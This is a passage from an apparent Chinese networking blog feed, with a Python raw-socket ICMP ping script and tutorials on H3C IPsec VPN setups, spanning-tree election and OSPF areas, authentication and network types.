class="comment">#返回一个可以利用的icmp原对象,当做属性使用</span></span><br><span class="line">        icmp = socket.getprotobyname(<span class="string">"icmp"</span>)<span class="comment">#指定服务</span></span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,icmp)<span class="comment">#socket.SOCK_RAW原生包</span></span><br><span class="line">        <span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__doCksum</span><span class="params">(self,packet)</span>:</span><span class="comment">#校验和运算</span></span><br><span class="line">        words = array.array(<span class="string">'h'</span>,packet)<span class="comment">#将包分割成2个字节为一组的网络序列</span></span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            sum += (word &amp; <span class="number">0xffff</span>)<span class="comment">#每2个字节相加</span></span><br><span class="line">        sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>)<span class="comment">#因为sum有可能溢出16位所以将最高位和低位sum相加重复二遍</span></span><br><span class="line">        sum += (sum &gt;&gt; <span class="number">16</span>) <span class="comment"># 为什么这里的sum不需要再 &amp; 0xffff 因为这里的sum已经是16位的不会溢出,可以手动测试超过65535的十进制数字就溢出了</span></span><br><span class="line">        <span class="keyword">return</span> (~sum) &amp; <span class="number">0xffff</span> <span class="comment">#最后取反返回完成校验</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__icmpPacket</span><span class="params">(self)</span>:</span><span class="comment">#icmp包的构造</span></span><br><span class="line">        header = struct.pack(<span class="string">'bbHHh'</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,self.__id,<span class="number">0</span>)</span><br><span class="line">        packet = header + self.__data</span><br><span class="line">        cksum = self.__doCksum(packet)</span><br><span class="line">        header = struct.pack(<span class="string">'bbHHh'</span>,<span class="number">8</span>,<span class="number">0</span>,cksum,self.__id,<span class="number">0</span>)<span class="comment">#将校验带入原有包,这里才组成头部,数据部分只是用来做校验所以返回的时候需要返回头部和数据相加</span></span><br><span class="line">        <span class="keyword">return</span> header + self.__data </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendPing</span><span class="params">(self,target_host)</span>:</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            socket.gethostbyname(target_host)</span><br><span class="line"></span><br><span class="line">            sock = self.__icmpSocket</span><br><span class="line">            sock.settimeout(self.timeout)</span><br><span class="line"></span><br><span class="line">            packet = self.__icmpPacket</span><br><span class="line"></span><br><span class="line">            sock.sendto(packet,(target_host,<span class="number">1</span>))<span class="comment">#发送icmp包</span></span><br><span class="line"></span><br><span class="line">            ac_ip = sock.recvfrom(<span class="number">1024</span>)[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] %s active'</span>%(ac_ip)</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            sock.close()</span><br><span class="line"></span><br><span class="line">s = Pinger()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.sendPing(<span class="string">'192.168.1.103'</span>)</span><br></pre></td></tr></table></figure><p>wireshark抓包查看</p><p>requests:<br><img src="/images/ping_r.jpg" alt="请输入图片描述"></p><p>reply:<br><img src="/images/ping_re.jpg" alt="请输入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;利用python发送icmp包详解-ping&quot;&gt;&lt;a href=&quot;#利用python发送icmp包详解-ping&quot; class=&quot;headerlink&quot; title=&quot;利用python发送icmp包详解(ping)&quot;&gt;&lt;/a&gt;利用python发送icmp包详解(p
      
    
    </summary>
    
    
      <category term="编程记录" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>IPSEC VPN配置的多种方法</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/IPSEC%20VPN%E9%85%8D%E7%BD%AE%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/IPSEC%20VPN%E9%85%8D%E7%BD%AE%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2017-04-22T15:18:48.000Z</published>
    <updated>2020-04-08T02:38:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用的网络产品为H3C系列</p><a id="more"></a><h1 id="IPSEC-VPN配置的多种方法"><a href="#IPSEC-VPN配置的多种方法" class="headerlink" title="IPSEC VPN配置的多种方法"></a>IPSEC VPN配置的多种方法</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>VPN一般有3种配置方法</p><p>名词介绍:</p><p>GRE(Generic Routing Encapsulation，通用路由封装):<br>是通用路由封装协议，可以对某些网络层协议的数据报进行封装，使这些被封装的数据报能够在IPv4网络中传输</p><p>IPsec（IP Security，IP安全）:<br>是IETF制定的三层隧道加密协议，它为互联网上传输的数据提供了高质量的、基于密码学的安全保证，是一种传统的实现三层VPN（Virtual Private Network，虚拟专用网络）的安全技术。IPsec通过在特定通信方之间（例如两个安全网关之间）建立“通道”，来保护通信方之间传输的用户数据，该通道通常称为IPsec隧道</p><p>IPsec SA (安全联盟):<br>可以手工创建或动态建立。IKE（Internet Key Exchange，互联网密钥交换）协议用来动态建立IPsec SA。<br>IKE并非IPsec专用，它利用ISAKMP（Internet Security Association and Key Management Protocol，互联网安全联盟和密钥管理协议）语言定义密钥交换的过程，是一种对安全服务进行协商的手段。</p><h2 id="0x01-Ipsec-vpn-ike自动协商"><a href="#0x01-Ipsec-vpn-ike自动协商" class="headerlink" title="0x01 Ipsec vpn (ike自动协商)"></a><strong>0x01 Ipsec vpn (ike自动协商)</strong></h2><p><img src="/images/ipsec_vpn.jpg" alt="请输入图片描述"></p><pre><code>R1:    ipsec transform-set H3C #定义ipsec加密方式     esp encryption-algorithm des-cbc      esp authentication-algorithm sha1     #    ipsec policy H3C 10 isakmp #定义ipsec 策略 isakmp自动协商     transform-set H3C      security acl 3000 #指定流量用ACL抓取     remote-address 12.12.12.2 #对端公网Ip     ike-profile H3C    #                  ike profile H3C # ike提议     keychain H3C     local-identity address 12.12.12.1     match remote identity address 12.12.12.2 255.255.255.255    #    ike proposal 1 # ike提议 加密方式     encryption-algorithm 3des-cbc     authentication-algorithm md5    #    ike keychain H3C #ike钥匙链二端匹配     pre-shared-key address 12.12.12.2 255.255.255.255 key cipher $c$3$y0yAxWiAdTMK3fNb8Co7DUIxu409DY1j2Q==    #    acl advanced 3000     rule 0 permit ip source 9.9.9.1 0 destination 9.9.9.2 0    #    int s 2/0     ipsec apply policy H3C</code></pre><p>R2:</p><pre><code>ipsec transform-set H3C #定义ipsec加密方式 esp encryption-algorithm des-cbc  esp authentication-algorithm sha1 #ipsec policy H3C 10 isakmp #定义ipsec 策略 isakmp自动协商 transform-set H3C  security acl 3000 #指定流量用ACL抓取 remote-address 12.12.12.1 #对端公网Ip ike-profile H3C#              ike profile H3C # ike提议 keychain H3C local-identity address 12.12.12.2 match remote identity address 12.12.12.1 255.255.255.255#ike proposal 1 # ike提议 加密方式 encryption-algorithm 3des-cbc authentication-algorithm md5#ike keychain H3C #ike钥匙链二端匹配 pre-shared-key address 12.12.12.1 255.255.255.255 key cipher $c$3$y0yAxWiAdTMK3fNb8Co7DUIxu409DY1j2Q==#acl advanced 3000 rule 0 permit ip source 9.9.9.2 0 destination 9.9.9.1 0#int s 2/0 ipsec apply policy H3C</code></pre><h2 id="0x02-gre-over-ipsec"><a href="#0x02-gre-over-ipsec" class="headerlink" title="0x02 gre over ipsec"></a><strong>0x02 gre over ipsec</strong></h2><p>需求的原因是:gre可以承载组播等非ip协议的流量 但是gre不可以加密,所以需要利用ipsec来进行对隧道的加密<br><img src="/images/gre_over_ipsec.jpg" alt="请输入图片描述"></p><p>用ipsec封装gre来承载组播等非IP流量<br>应用在物理接口<br>ACL抓公网2个对端的流量<br>从tunnel的源地址和目标地址之间的所有流量都会经过ipsec进行加密</p><p>gre over ipsec 一开始流量走tunnel但是 源和目的是公网就会被ipsec匹配到进行加密后再传输</p><p>1.定义公网二端ACL(抓取tunnel源和目的)<br>2.ipsec源目的地址是公网二端地址<br>3.接口应用在公网接口上</p><pre><code>R1：    ipsec transform-set H3C     esp encryption-algorithm des-cbc      esp authentication-algorithm md5     #    ipsec policy H3C 10 isakmp     transform-set H3C      security acl 3000      remote-address 12.12.12.2     ike-profile H3C    #    ike profile H3C     keychain H3C     local-identity address 12.12.12.1     match remote identity address 12.12.12.2 255.255.255.252    #    ike keychain H3C     pre-shared-key address 12.12.12.2 255.255.255.252 key cipher $c$3$30ReBVN2wyf5cOcToan6XoSf+yADB/fE5A==    #     ip route-static 0.0.0.0 0 12.12.12.2     ip route-static 9.9.9.2 32 Tunnel1    #    acl advanced 3000     rule 0 permit ip source 12.12.12.1 0 destination 12.12.12.2 0   //抓取公网对端流量 因为tunnel的源和目的会匹配到的    #    interface Tunnel1 mode gre     ip address 10.1.1.1 255.255.255.252     source 12.12.12.1     destination 12.12.12.2    interface GigabitEthernet0/0     port link-mode route     ip address 12.12.12.1 255.255.255.252     ipsec apply policy H3C    #R2:ipsec transform-set H3C esp encryption-algorithm des-cbc  esp authentication-algorithm md5 #ipsec policy H3C 10 isakmp transform-set H3C  security acl 3000  remote-address 12.12.12.1 ike-profile H3C#ike profile H3C keychain H3C local-identity address 12.12.12.2 match remote identity address 12.12.12.1 255.255.255.252#ike keychain H3C pre-shared-key address 12.12.12.1 255.255.255.252 key cipher $c$3$30ReBVN2wyf5cOcToan6XoSf+yADB/fE5A==# ip route-static 0.0.0.0 0 12.12.12.1 ip route-static 9.9.9.1 32 Tunnel1#acl advanced 3000 rule 0 permit ip source 12.12.12.2 0 destination 12.12.12.1 0   //抓取公网对端流量 因为tunnel的源和目的会匹配到的#interface Tunnel1 mode gre ip address 10.1.1.2 255.255.255.252 source 12.12.12.2 destination 12.12.12.1interface GigabitEthernet0/0 port link-mode route ip address 12.12.12.2 255.255.255.252 ipsec apply policy H3C#</code></pre><h2 id="0x03-Ipsec-over-gre"><a href="#0x03-Ipsec-over-gre" class="headerlink" title="0x03 Ipsec over gre"></a><strong>0x03 Ipsec over gre</strong></h2><p>需要场景:当开通GRE隧道但是只需要让指定流量加密就需要用ipsec over gre部分加密</p><p><img src="/images/ipsec_over_gre.jpg" alt="请输入图片描述"></p><p>在GRE隧道中封装IPSEC 加密指定流量数据包 但是其他数据不会加密<br>ipsec应用在tunnel 接口<br>抓取要加密的内网流量<br>所有对端都以tunnel定义的2个地址来进行ike/ipsec协商</p><p>ipsec over gre是 gre为主通道 ipsec部分抓取流量加密<br>ipsec的所有源和目的地址都是tunnel的地址</p><p>1.定义兴趣流量<br>2.ipsec源目的地址是tunnel二端地址<br>3.ipsec应用在tunnel接口</p><pre><code>R1:    interface LoopBack0     ip address 9.9.9.1 255.255.255.255    #    interface GigabitEthernet0/0     port link-mode route     ip address 12.12.12.1 255.255.255.252    #    interface Tunnel1 mode gre     ip address 13.13.13.1 255.255.255.0     source GigabitEthernet0/0     destination 12.12.12.2     ipsec apply policy H3C  //应用在tunnel接口    ipsec transform-set H3C     esp encryption-algorithm des-cbc      esp authentication-algorithm md5     #    ipsec policy H3C 10 isakmp     transform-set H3C      security acl 3000      remote-address 13.13.13.2  //tunnel对端地址     ike-profile H3C    #    ike profile H3C     keychain H3C     local-identity address 13.13.13.1  //tunnel本地地址     match remote identity address 13.13.13.2 255.255.255.0    #    ike keychain H3C     pre-shared-key address 13.13.13.2 255.255.255.0 key cipher $c$3$w+qQmJZ1ELXbjvqueE+UqXstxQhnilx47A==    #    acl advanced 3000     rule 0 permit ip source 9.9.9.1 0 destination 9.9.9.2 0    #R2：    interface LoopBack0     ip address 9.9.9.2 255.255.255.255    #    interface GigabitEthernet0/0     port link-mode route     ip address 12.12.12.2 255.255.255.252    #    interface Tunnel1 mode gre     ip address 13.13.13.2 255.255.255.0     source GigabitEthernet0/0     destination 12.12.12.1     ipsec apply policy H3C  //应用在tunnel接口    ipsec transform-set H3C     esp encryption-algorithm des-cbc      esp authentication-algorithm md5     #    ipsec policy H3C 10 isakmp     transform-set H3C      security acl 3000      remote-address 13.13.13.1  //tunnel对端地址     ike-profile H3C    #    ike profile H3C     keychain H3C     local-identity address 13.13.13.2  //tunnel本地地址     match remote identity address 13.13.13.1 255.255.255.0    #    ike keychain H3C     pre-shared-key address 13.13.13.1 255.255.255.0 key cipher $c$3$w+qQmJZ1ELXbjvqueE+UqXstxQhnilx47A==    #    acl advanced 3000     rule 0 permit ip source 9.9.9.2 0 destination 9.9.9.1 0    #</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用的网络产品为H3C系列&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【spanning-tree】生成树实例</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/spanning-tree-%E7%94%9F%E6%88%90%E6%A0%91%E5%AE%9E%E4%BE%8B/"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/spanning-tree-%E7%94%9F%E6%88%90%E6%A0%91%E5%AE%9E%E4%BE%8B/</id>
    <published>2017-01-09T04:18:48.000Z</published>
    <updated>2020-04-08T02:37:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>STP（IEEE802.1D生成树协议）</p><a id="more"></a><h1 id="【spanning-tree】生成树实例"><a href="#【spanning-tree】生成树实例" class="headerlink" title="【spanning-tree】生成树实例"></a>【spanning-tree】生成树实例</h1><p>STP（IEEE802.1D生成树协议）技术原理：</p><p>维护一个树状的网络拓扑，当交换机发现拓扑中有环时，就会逻辑的阻塞一个或更多冗余端口来实现无环拓扑，当网络拓扑发生变化时，运行STP的交换机会自动重新配置他的端口以避免环路产生或连接丢失。</p><p>STP算法分四个步骤：</p><p><strong>步骤一：选举根网桥</strong></p><p>判定对象：在所有运行STP协议的交换机上选举出一个唯一的根网桥。</p><p>判定条件：BPDU数据帧中网桥ID值最小的交换机将成为根网桥（BPDU数据帧中网桥ID有8个字节，它是由2个字节的网桥优先级和6个字节的背板MAC组成的，其中网桥优先级的取值范围是0-65535，缺省值是32768）</p><p>—在进行网桥ID比较时，先比较网桥优先级，优先级值小的为根网桥；当优先级值相等时，再比较背板MAC地址，MAC地址小的为根网桥。</p><p><strong>步骤二：选举跟端口</strong></p><p>判定对象：在所有非根网桥交换机上的不同端口之间选举出一个到根网桥最近的端口作为跟端口。</p><p>判定条件：</p><ul><li><p>—1.<strong>端口</strong>到根网桥路径开销最小</p><p>—2.发送方网桥ID最小</p><p>—3.发送方端口ID最小（端口ID有16位，它是由8位端口优先级和8位端口编号组成的，其中端口优先级的取值范围是0-240，缺省值是128，可以修改，但必须是16的倍数）</p></li></ul><p><strong>步骤三：选举指定端口</strong></p><p>判定对象：在每一个物理网段的不同端口之间选举出一个指定端口。</p><p>判定条件：</p><ul><li><p>—1.<strong>网桥</strong>到根网桥路径开销最小</p><p>—2.发送方网桥ID最小</p><p>—3.发送方端口ID最小</p></li></ul><p><strong>步骤四：阻塞其它端口，形成无环拓扑</strong></p><p>请看STP算法一实例：</p><p>拓扑图</p><p><img src="http://www.jianfensec.com/usr/uploads/spanning-tree.jpg" alt="请输入图片描述"></p><p><strong>步骤一：选举根网桥</strong></p><ul><li>—比较四个交换机(SW1、SW2、SW3和SW4)的网桥ID,四个交换机的优先级都是32768，优先级相等，再比较背板MAC，显然SW1的背板MAC最小，所以SW1的网桥ID最小，SW1是根网桥。</li></ul><p><strong>步骤二：选举跟端口</strong></p><p>—在SW2上</p><ul><li>端口到根网桥路径开销：0/1=19&lt;0/2=19+19,所以0/1号端口是SW2的根端口。</li></ul><p>—在SW3上</p><ul><li>端口到根网桥路径开销：0/3=19&lt;0/2=19+19,所以0/3号端口是SW3的根端口。</li></ul><p>—在SW4上</p><ul><li>端口到根网桥路径开销：0/1=19&lt;0/2=19+19,所以0/1号端口是SW4的根端口。</li></ul><p><strong>步骤三：选举指定端口</strong></p><p>—在SW1-SW2的物理网段上</p><ul><li>SW1上的0/1号端口的网桥到根网桥的路径开销是0，而SW2上的0/1号端口的网桥到根网桥的路径开销是19，所以在SW1-SW2的物理网段上，SW1上的0/1号端口是指定端口。</li></ul><p>—在SW1—SW3的物理网段上</p><ul><li>SW1上的0/3号端口的网桥到根网桥的路径开销是0，而SW3上的0/3号端口的网桥到根网桥的路径开销是19，所以SW1—SW3的物理网段上，SW1上的0/3号端口是指定端口。</li></ul><p>—在SW1—SW4的物理网段上</p><ul><li>SW1上的0/2号端口的网桥到根网桥的路径开销是0，而SW4上的0/1号端口的网桥到根网桥的路径开销是19，所以在SW1-SW4的物理网段上，SW1上的0/2号端口是指定端口。</li></ul><p>—在SW2—SW3的物理网段上</p><ul><li>SW2上的0/2号端口和SW3上的0/2号端口的网桥到根网桥的路径开销都是19，再比较两端口的发送方网桥ID,SW2上的0/2号端口的发送方网桥是32768.000d.280c.b300,而SW3上的0/2号端口的发送方网桥是32768.000d.280b.b200,所以在SW2-SW3的物理网段上，SW2上的0/2号端口是指定端口。</li></ul><p>—在SW3—SW4的物理网段上</p><ul><li>SW3上的0/1号端口和SW4上的0/2号端口的网桥到根网桥的路径开销都是19，再比较两端口的发送方网桥ID，SW3上的0/1号端口的发送方网桥是32768.000d.280d.b100,而SW4上的0/2号端口的发送方网桥是32768.000d.280c.b300,所以在SW3-SW4的物理网段上，SW3上的0/1号端口是指定端口。</li></ul><p><strong>步骤四：阻塞端口</strong>（SW3上的0/2号端口和SW4上的0/2号端口）</p><p>最后的STP生成拓扑图<br><img src="http://www.jianfensec.com/usr/uploads/spanning-tree-2.jpg" alt="请输入图片描述"></p><p>结论：在根网桥上的所有端口都是指定端口，同一个交换机（除了根网桥）上的端口只能属于一种端口，不可能是根端口同时兼指定端口</p><p>PS:<strong>最需要注意的是 根端口选举是根据 端口到根桥的cost，而指定端口选举是根据该网桥到根桥的cost</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;STP（IEEE802.1D生成树协议）&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【OSPF】特殊区域和认证方式</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%89%B9%E6%AE%8A%E5%8C%BA%E5%9F%9F%E5%92%8COSPF%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%89%B9%E6%AE%8A%E5%8C%BA%E5%9F%9F%E5%92%8COSPF%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/</id>
    <published>2016-10-24T15:18:48.000Z</published>
    <updated>2020-04-08T02:38:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【OSPF】特殊区域和认证方式"><a href="#【OSPF】特殊区域和认证方式" class="headerlink" title="【OSPF】特殊区域和认证方式"></a>【OSPF】特殊区域和认证方式</h1><p>ospf 特殊区域的实质是为了减少区域内路由表条目的数量</p><hr><h2 id="stub-area-区域"><a href="#stub-area-区域" class="headerlink" title="stub area 区域"></a>stub area 区域</h2><ul><li>规则:<pre><code>1.当stub area中有多个ABR,会同时下放默认路由这时要通过cost值来进行选路或者负载均衡2.一旦区域被标示为stub area那么stub area内所有路由器均要配置stub标示(Hello包建邻居要求)3.在stub area中不能存在ASBR4.stub area不能是area 0 (骨干区域)5.作为stub area无法再外挂其他区域(如:虚链路技术)</code></pre></li></ul><p>命令:</p><p>在区域内所有路由器:</p><pre><code>router ospf 110  area 1 stub  area 1 default-cost 10 (手动设置下放默认路由的cost用于选路默认为1) 立刻生效</code></pre><p>作用:过滤4/5类LSA（外部路由）</p><p>主动下放默认路由: [O IA]下放3类默认路由 seed cost = 1(初始cost值)</p><hr><h2 id="totally-stubby-Area-完全末节区域"><a href="#totally-stubby-Area-完全末节区域" class="headerlink" title="totally stubby Area (完全末节区域)"></a>totally stubby Area (完全末节区域)</h2><p>在末节区域基础之上</p><ul><li>规则:<pre><code>1.Cisco私有区域2.stub area的规则适用于totally stub area3.只需比stub area在ABR上area 1 stub no-summary</code></pre></li></ul><p>命令:</p><p>在stub区域的ABR路由器:</p><pre><code>router ospf 110    area 1 stub no-summary        area 1 default-cost 10 (手动设置下放默认路由的cost用于选路默认为1) 立刻生效</code></pre><p>作用:过滤3/4/5类LSA(域间和域外路由)</p><p>主动下放默认路由: [O IA]下放3类默认路由 seed cost = 1(初始cost值)</p><hr><h2 id="Not-So-stubby-Areas-NSSA区域-‘不那么末节的区域’"><a href="#Not-So-stubby-Areas-NSSA区域-‘不那么末节的区域’" class="headerlink" title="Not-So-stubby Areas NSSA区域 ‘不那么末节的区域’"></a>Not-So-stubby Areas NSSA区域 ‘不那么末节的区域’</h2><ul><li>规则:<pre><code>1.可以存在ASBR2.引入外部路由但又要过滤从域间传来的5类LSA3.产生7类LSA(只在NSSA区域传播)  - link ID        路由  - ADV router        路由产生者的RID</code></pre></li></ul><p>命令:</p><p>在区域内所有路由器:</p><ul><li>router ospf 110<pre><code>area 2 nssa</code></pre></li></ul><p>作用:过滤4/5类LSA 产生7类LSA（在区域再引入外部又不能存在5类所以为7类）到其他区域会以7类转5类LSA形式传播</p><p>手动下放默认路由: 下放一条O<em>N2 7类LSA默认路由<br>在NSSA区域的ABR的路由进程中 area 2 nssa default-information-originate  (seed cost = 1  O</em> N2 不累加cost)</p><hr><h2 id="totally-stubby-Not-So-stubby-Areas-‘完全的NSSA区域’"><a href="#totally-stubby-Not-So-stubby-Areas-‘完全的NSSA区域’" class="headerlink" title="totally stubby Not-So-stubby Areas ‘完全的NSSA区域’"></a>totally stubby Not-So-stubby Areas ‘完全的NSSA区域’</h2><p>在NSSA区域基础之上</p><p>命令:</p><p>在NSSA区域内ABR路由器:</p><ul><li>router ospf 110<pre><code>area 2 nssa no-summary</code></pre></li></ul><p>作用:过滤3/4/5类LSA 产生7类LSA（在区域再引入外部又不能存在5类所以为7类）到其他区域会以7类转5类LSA形式传播</p><p>主动下放默认路由: [O IA]下放3类默认路由 seed cost = 1(初始cost值)</p><hr><p>NSSA扩展:</p><ul><li>当NSSA区域的ABR 重分布外部路由:<pre><code>1.普通区域接受到的是正常外部5类LSA路由E22.NSSA区域接受到的是7类LSA路由N2</code></pre></li></ul><p>在NSSA区域的ABR路由进程 优选做法<br>area 2 nssa no-redistrubution no-summary 过滤nssa中的N2路由 因为NSSA区域已经存在默认路由</p><hr><p>不规则区域:<br>    1.远离area 0<br>    2.分隔的area 0 （多area 0  常用于割接）</p><p>解决不规则区域:<br>  1.远离area 0</p><pre><code>1)多进程的双向重分布        在ABR上建立2个进程分别重分布OSPF不同进程        同一路由器:        router ospf 110            network 13.1.1.0 0.0.0.255 area 2            redistribute ospf 100 subnets        router ospf 100            network 35.1.1.0 0.0.0.255 area 3            redistribute ospf 110 subnets    2)Tunnel隧道        在area 0和area 3最近的路由器上做隧道        int tunnel 1            tunnel source 13.1.1.1            tunnel destination 13.1.1.3            ip add 172.16.1.1 255.255.255.0 自建ip地址        int tunnel 1            tunnel source 13.1.1.3            tunnel destination 13.1.1.1            ip add 172.16.1.2 255.255.255.0 自建ip地址        靠近area 0的路由器 把tunnel宣告进area 0        router ospf 110            network 172.16.1.0 0.0.0.255 area 0        靠近area 3的路由器 把tunnel宣告进area 0        router ospf 110            network 172.16.1.0 0.0.0.255 area 0    3)Defining Virtunal Links 虚链路        通过1类LSA知道RID再找到直连路由信息 建立虚链路        area 2 virtual-link 3.3.3.3 对方RID        area 2 virtual-link 1.1.1.1        show ip ospf virtual-links            adjacency state FULL 状态成功</code></pre><hr><h2 id="OSPF-authentication-Types-ospf认证方式"><a href="#OSPF-authentication-Types-ospf认证方式" class="headerlink" title="OSPF authentication Types ospf认证方式"></a>OSPF authentication Types ospf认证方式</h2><ul><li>认证分2个步骤:<pre><code>1.启动秘钥2.启动认证</code></pre></li></ul><ul><li>认证强度:<pre><code>1.simple2.md5</code></pre></li></ul><p>认证应用方式:</p><pre><code>1.link authentication 链路认证    在链路两端的接口配置:    1)int s0/0        ip ospf authentication-key cisco 启动明文秘钥        ip ospf authentication 启动明文认证    2)int s0/0         ip ospf message-digest-key 1 md5 cisco 启动密文秘钥     ip ospf authentication message-digest 启动密文认证2.area authentication 区域认证    在接口下启动明文秘钥    1)int s0/0           ip ospf authentication-key cisco    在路由进程中启动区域认证    router ospf 110        area 1 authentication    在接口下启动密文秘钥    1)int s0/0           ip ospf message-digest-key 1 md5 cisco    在路由进程中启动密文区域认证    router ospf 110        area 1 authentication message-digest3.virtual link authentication 虚链路认证    明文认证在路由进程中        area 2 virtual-link 3.3.3.3 authentication-key cisco        area 2 virtual-link 3.3.3.3 authentication    密文认证在路由进程中        area 2 virtual-link 3.3.3.3 message-digest-key 1 md5 cisco        area 2 virtual-link 3.3.3.3 authentication message-digest</code></pre><p>PS:<strong>当存在虚链路的环境要求做area 0认证需要在tunnel接口下也开启明文/密文配置<br>    在虚链路对端路由器在路由进程中开启认证area 0 authentication<br>    因为tunnel将R3接到了area 0 上</strong></p><h2 id><a href="#" class="headerlink" title></a><img src="http://jianfensec.com/usr/uploads/ospf3.jpg" alt="请输入图片描述"></h2><h2 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h2><p>等价负载均衡<br>默认:maxumum-paths 4<br>router ospf 110<br>    maxumun-paths 6 最大</p><p>被动接口 (常用于loopback口)<br>不收发OSPF报文不代表其他路由器收不到路由被动接口只是将network命令的第一条发送hello包过滤</p><ul><li>**network 命令的作用:<pre><code>1.发送hello包2.通告路由**</code></pre></li></ul><p>router ospf 110<br>    passive-interface loopback 0</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;【OSPF】特殊区域和认证方式&quot;&gt;&lt;a href=&quot;#【OSPF】特殊区域和认证方式&quot; class=&quot;headerlink&quot; title=&quot;【OSPF】特殊区域和认证方式&quot;&gt;&lt;/a&gt;【OSPF】特殊区域和认证方式&lt;/h1&gt;&lt;p&gt;ospf 特殊区域的实质是为了减少区
      
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【OSPF】网络类型介绍</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%BD%91%E7%BB%9C%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%BD%91%E7%BB%9C%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D/</id>
    <published>2016-10-24T15:18:48.000Z</published>
    <updated>2020-04-08T02:39:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【OSPF】网络类型介绍"><a href="#【OSPF】网络类型介绍" class="headerlink" title="【OSPF】网络类型介绍"></a>【OSPF】网络类型介绍</h1><p>OSPF网络类型是物理接口的一种属性</p><pre><code>- OSPF  network types        默认接口                特点        1.Loopback              Loopback               32位                2.Point-to-Point        Serial/                   组播/无DR                              FR&apos;s P2Psub-if      3.Broadcast                Ethernet               组播/选DR      4.NBMA                    FR&apos;s Physical/           单播/选DR                              FR&apos;s MPsub-if      5.P2MP                    ------------           组播/无DR/32位直连接口路由      6.P2MP NBMA                ------------           单播/无DR/32位直连接口路由</code></pre><p>hello包时间间隔</p><p>broadcast/Point-to-Point  10S    40S dead时间<br>NBMA/Point-to-multipoint/Point-to-multipoint nonbroadcast 30S    120S dead时间</p><p>二种不同网络类型建立邻居需要修改hello包间隔时间<br>(config-if)ip ospf hello-intrval 30</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;【OSPF】网络类型介绍&quot;&gt;&lt;a href=&quot;#【OSPF】网络类型介绍&quot; class=&quot;headerlink&quot; title=&quot;【OSPF】网络类型介绍&quot;&gt;&lt;/a&gt;【OSPF】网络类型介绍&lt;/h1&gt;&lt;p&gt;OSPF网络类型是物理接口的一种属性&lt;/p&gt;
&lt;pre&gt;&lt;c
      
    
    </summary>
    
    
      <category term="网络工程" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【OSPF】理解不同区域LSA(链路状态通告)</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/OSPF%E7%90%86%E8%A7%A3%E4%B8%8D%E5%90%8C%E5%8C%BA%E5%9F%9FLSA(%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E9%80%9A%E5%91%8A)/"/>
